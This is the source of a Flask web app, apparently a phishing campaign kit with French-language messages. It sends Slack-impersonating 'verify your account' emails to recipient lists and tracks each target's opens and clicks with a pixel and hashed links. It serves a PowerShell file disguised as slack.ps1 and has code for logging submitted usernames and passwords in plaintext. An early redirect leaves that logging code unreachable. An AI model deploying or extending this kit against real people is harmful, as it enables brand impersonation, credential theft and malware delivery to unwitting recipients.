import csv
import json
import os
import smtplib
import uuid
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from flask import (
    Flask,
    abort,
    flash,
    redirect,
    render_template,
    request,
    send_file,
    url_for,
)

SMTP_SERVER = os.environ.get("SMTP_SERVER", "x")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))
FROM_EMAIL = os.environ.get("PHISHING_FROM_EMAIL", "x")
FROM_PASSWORD = os.environ.get("PHISHING_FROM_PASSWORD", "x")

BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "data"
DATA_DIR.mkdir(exist_ok=True)

EVENTS_FILE = DATA_DIR / "events.csv"
CREDENTIALS_FILE = DATA_DIR / "credentials.csv"
HASH_MAP_FILE = DATA_DIR / "hash_mapping.json"
CAMPAIGNS_FILE = DATA_DIR / "campaigns.json"
ATTACHMENT_PATH = BASE_DIR / "slack.ps1"

CSV_DELIMITER = ";"

EVENT_FIELDS = ["timestamp", "event", "hash_id", "email", "campaign", "details"]
CREDENTIAL_FIELDS = [
    "timestamp",
    "hash_id",
    "email",
    "campaign",
    "username",
    "password",
]


app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("FLASK_SECRET_KEY", "change-me")


def format_timestamp(value: Optional[str]) -> str:
    if not value:
        return "-"
    try:
        dt = datetime.fromisoformat(value)
        return dt.strftime("%d/%m/%Y %H:%M:%S")
    except ValueError:
        return value


def append_dict_row(file_path: Path, fieldnames: List[str], row: Dict[str, str]) -> None:
    file_path.parent.mkdir(parents=True, exist_ok=True)
    file_exists = file_path.exists()
    with file_path.open("a", newline="", encoding="utf-8") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames, delimiter=CSV_DELIMITER)
        if not file_exists or file_path.stat().st_size == 0:
            writer.writeheader()
        writer.writerow(row)


def read_csv_records(file_path: Path) -> List[Dict[str, str]]:
    if not file_path.exists() or file_path.stat().st_size == 0:
        return []
    with file_path.open("r", newline="", encoding="utf-8") as csvfile:
        reader = csv.DictReader(csvfile, delimiter=CSV_DELIMITER)
        return list(reader)


def load_hash_map() -> Dict[str, Dict[str, str]]:
    if not HASH_MAP_FILE.exists():
        return {}
    with HASH_MAP_FILE.open("r", encoding="utf-8") as file:
        return json.load(file)


def save_hash_map(mapping: Dict[str, Dict[str, str]]) -> None:
    with HASH_MAP_FILE.open("w", encoding="utf-8") as file:
        json.dump(mapping, file, indent=2, ensure_ascii=False)


def register_hash(hash_id: str, email: str, campaign: Optional[str]) -> None:
    mapping = load_hash_map()
    mapping[hash_id] = {
        "email": email,
        "campaign": campaign,
        "created_at": datetime.utcnow().isoformat(),
    }
    save_hash_map(mapping)


def get_hash_info(hash_id: Optional[str]) -> Dict[str, Optional[str]]:
    if not hash_id:
        return {"email": None, "campaign": None}
    mapping = load_hash_map()
    return mapping.get(hash_id, {"email": None, "campaign": None})


def load_campaigns() -> List[Dict[str, object]]:
    if not CAMPAIGNS_FILE.exists():
        return []
    with CAMPAIGNS_FILE.open("r", encoding="utf-8") as file:
        campaigns = json.load(file)
    campaigns.sort(key=lambda item: item.get("created_at", ""), reverse=True)
    return campaigns


def save_campaigns(campaigns: List[Dict[str, object]]) -> None:
    with CAMPAIGNS_FILE.open("w", encoding="utf-8") as file:
        json.dump(campaigns, file, indent=2, ensure_ascii=False)


def parse_recipients(raw_recipients: str) -> List[str]:
    recipients: List[str] = []
    if not raw_recipients:
        return recipients
    separators = [",", "\n", ";"]
    temp = raw_recipients
    for separator in separators:
        temp = temp.replace(separator, "\n")
    for line in temp.splitlines():
        email = line.strip()
        if email and email not in recipients:
            recipients.append(email)
    return recipients


def create_hash(email: str) -> str:
    seed = f"{datetime.utcnow().isoformat()}:{email}:{uuid.uuid4().hex}"
    return uuid.uuid5(uuid.NAMESPACE_DNS, seed).hex


def log_event(
    event_type: str,
    hash_id: Optional[str],
    *,
    email: Optional[str] = None,
    campaign: Optional[str] = None,
    details: Optional[str] = None,
) -> None:
    row = {
        "timestamp": datetime.utcnow().isoformat(),
        "event": event_type,
        "hash_id": hash_id or "",
        "email": email or "",
        "campaign": campaign or "",
        "details": details or "",
    }
    append_dict_row(EVENTS_FILE, EVENT_FIELDS, row)


def log_credentials(
    hash_id: Optional[str],
    email: Optional[str],
    campaign: Optional[str],
    username: str,
    password: str,
) -> None:
    row = {
        "timestamp": datetime.utcnow().isoformat(),
        "hash_id": hash_id or "",
        "email": email or "",
        "campaign": campaign or "",
        "username": username,
        "password": password,
    }
    append_dict_row(CREDENTIALS_FILE, CREDENTIAL_FIELDS, row)



def send_phishing_email(to_email: str, campaign_name: Optional[str]) -> Tuple[bool, str]:
    hash_id = create_hash(to_email)
    register_hash(hash_id, to_email, campaign_name)

    pixel_url = url_for("openedmail", id=hash_id, _external=True)
    landing_url = url_for("landing", id=hash_id, _external=True)
    download_url = url_for("downloadattachement", id=hash_id, _external=True)

    html_mail = render_template(
        "emails/phishing_email.html",
        landing_url=landing_url,
        download_url=download_url,
        pixel_url=pixel_url,
        campaign_name=campaign_name,
    )

    msg = MIMEMultipart("alternative")
    msg["Subject"] = "Slack - Action requise : Vérifiez votre compte"
    msg["From"] = FROM_EMAIL
    msg["To"] = to_email
    msg.attach(MIMEText(html_mail, "html"))

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            if FROM_PASSWORD:
                server.login(FROM_EMAIL, FROM_PASSWORD)
            server.sendmail(FROM_EMAIL, [to_email], msg.as_string())
    except Exception as exc:  # pragma: no cover - SMTP errors are runtime dependent
        return False, str(exc)

    log_event("email_sent", hash_id, email=to_email, campaign=campaign_name)
    return True, hash_id


app.jinja_env.filters["format_timestamp"] = format_timestamp


@app.route("/")
def home():
    campaigns = load_campaigns()
    events = read_csv_records(EVENTS_FILE)
    credentials = read_csv_records(CREDENTIALS_FILE)

    return render_template(
        "index.html",
        campaigns=campaigns[:5],
        campaign_count=len(campaigns),
        events_count=len(events),
        credentials_count=len(credentials),
    )


@app.route("/sendphishing", methods=["POST"])
def sendphishing():
    email = request.form.get("email", "").strip()
    if not email:
        flash("Veuillez indiquer une adresse e-mail.", "error")
        return redirect(url_for("home"))

    success, info = send_phishing_email(email, campaign_name=None)
    if success:
        flash(f"Mail envoyé à {email}.", "success")
    else:
        flash(f"Erreur lors de l'envoi à {email}: {info}", "error")
    return redirect(url_for("home"))


@app.route("/campaigns", methods=["GET", "POST"])
def campaigns_view():
    campaigns = load_campaigns()
    if request.method == "POST":
        name = request.form.get("name", "").strip()
        description = request.form.get("description", "").strip()
        recipients_raw = request.form.get("recipients", "")
        recipients = parse_recipients(recipients_raw)

        if not name:
            flash("Le nom de la campagne est obligatoire.", "error")
        elif not recipients:
            flash("Veuillez saisir au moins une adresse e-mail.", "error")
        else:
            campaign = {
                "id": uuid.uuid4().hex,
                "name": name,
                "description": description,
                "recipients": recipients,
                "created_at": datetime.utcnow().isoformat(),
                "last_sent_at": None,
                "total_emails_sent": 0,
            }
            campaigns.append(campaign)
            save_campaigns(campaigns)
            flash(
                f"Campagne « {name} » créée avec {len(recipients)} destinataire(s).",
                "success",
            )
        return redirect(url_for("campaigns_view"))

    return render_template("campaigns.html", campaigns=campaigns)


@app.route("/campaigns/<campaign_id>/send", methods=["POST"])
def launch_campaign(campaign_id: str):
    campaigns = load_campaigns()
    campaign = next((item for item in campaigns if item["id"] == campaign_id), None)

    if not campaign:
        flash("Campagne introuvable.", "error")
        return redirect(url_for("campaigns_view"))

    recipients = campaign.get("recipients", [])
    if not recipients:
        flash("Cette campagne ne contient aucun destinataire.", "error")
        return redirect(url_for("campaigns_view"))

    success_count = 0
    errors: List[str] = []
    for email in recipients:
        success, info = send_phishing_email(email, campaign_name=campaign.get("name"))
        if success:
            success_count += 1
        else:
            errors.append(f"{email}: {info}")

    for stored_campaign in campaigns:
        if stored_campaign["id"] == campaign_id:
            stored_campaign["last_sent_at"] = datetime.utcnow().isoformat()
            stored_campaign["total_emails_sent"] = stored_campaign.get(
                "total_emails_sent", 0
            ) + success_count
            break
    save_campaigns(campaigns)

    if errors:
        flash(
            f"Campagne envoyée avec {success_count} succès et {len(errors)} échec(s).",
            "warning",
        )
        for error in errors:
            flash(error, "error")
    else:
        flash(f"Campagne envoyée à {success_count} destinataire(s).", "success")

    return redirect(url_for("campaigns_view"))


@app.route("/phisingpixel")
def openedmail():
    hash_id = request.args.get("id")
    info = get_hash_info(hash_id)
    log_event(
        "email_opened",
        hash_id,
        email=info.get("email"),
        campaign=info.get("campaign"),
    )
    return "", 204


@app.route("/landing")
def landing():
    hash_id = request.args.get("id")
    info = get_hash_info(hash_id)
    log_event(
        "link_clicked",
        hash_id,
        email=info.get("email"),
        campaign=info.get("campaign"),
    )
    return render_template("landing.html", hash_id=hash_id)


@app.route("/download")
def downloadattachement():
    hash_id = request.args.get("id")
    info = get_hash_info(hash_id)
    log_event(
        "attachment_downloaded",
        hash_id,
        email=info.get("email"),
        campaign=info.get("campaign"),
    )

    if not ATTACHMENT_PATH.exists():
        abort(404)

    filename = "slack.ps1"
    return send_file(
        ATTACHMENT_PATH,
        as_attachment=True,
        download_name=filename,
    )


@app.route("/visualize")
def visualize():
    events = sorted(
        read_csv_records(EVENTS_FILE),
        key=lambda row: row.get("timestamp", ""),
        reverse=True,
    )
    credentials = sorted(
        read_csv_records(CREDENTIALS_FILE),
        key=lambda row: row.get("timestamp", ""),
        reverse=True,
    )
    return render_template(
        "visualize.html",
        events=events,
        credentials=credentials,
    )


@app.route("/guide")
def guide():
    return render_template("guide.html")


@app.errorhandler(404)
def page_not_found(_: Exception):
    return render_template("404.html"), 404


@app.route("/login", methods=["POST"])
def login():
    hash_id = request.args.get("id")
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    info = get_hash_info(hash_id)
    email = info.get("email")
    campaign = info.get("campaign")
    return redirect("https://slack.com/logine")

    log_credentials(hash_id, email, campaign, username, password)
    log_event(
        "credentials_submitted",
        hash_id,
        email=email,
        campaign=campaign,
        details=f"username={username}",
    )

    return render_template("login_success.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000, debug=True)
